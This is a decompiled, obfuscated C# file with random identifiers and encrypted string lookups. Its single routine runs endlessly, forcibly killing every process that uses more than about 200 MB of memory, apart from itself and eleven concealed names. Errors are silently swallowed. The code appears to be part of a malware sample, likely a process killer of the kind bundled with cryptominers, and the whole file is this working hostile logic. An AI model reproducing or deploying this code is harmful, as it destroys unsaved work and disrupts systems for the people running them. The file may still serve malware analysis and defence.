using System;
using System.Diagnostics;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace EJhaxGWLzpBbb;

public static class ijYwfttZAkMpAn
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void jHwYscoSaxfn()
	{
		while (true)
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (process.PrivateMemorySize64 > 209715200L && process.ProcessName != Process.GetCurrentProcess().ProcessName && !process.ProcessName.Contains(getString_0(107195610)) && !process.ProcessName.Contains(getString_0(107195601)) && !process.ProcessName.Contains(getString_0(107195624)) && !process.ProcessName.Contains(getString_0(107195615)) && !process.ProcessName.Contains(getString_0(107195570)) && !process.ProcessName.Contains(getString_0(107195589)) && !process.ProcessName.Contains(getString_0(107195544)) && !process.ProcessName.Contains(getString_0(107195563)) && !process.ProcessName.Contains(getString_0(107195550)) && !process.ProcessName.Contains(getString_0(107195505)) && !process.ProcessName.Contains(getString_0(107195484)))
					{
						process.Kill();
					}
				}
				catch
				{
				}
			}
			try
			{
				Thread.Sleep(2500);
			}
			catch
			{
			}
		}
	}

	static ijYwfttZAkMpAn()
	{
		Strings.CreateGetStringDelegate(typeof(ijYwfttZAkMpAn));
	}
}
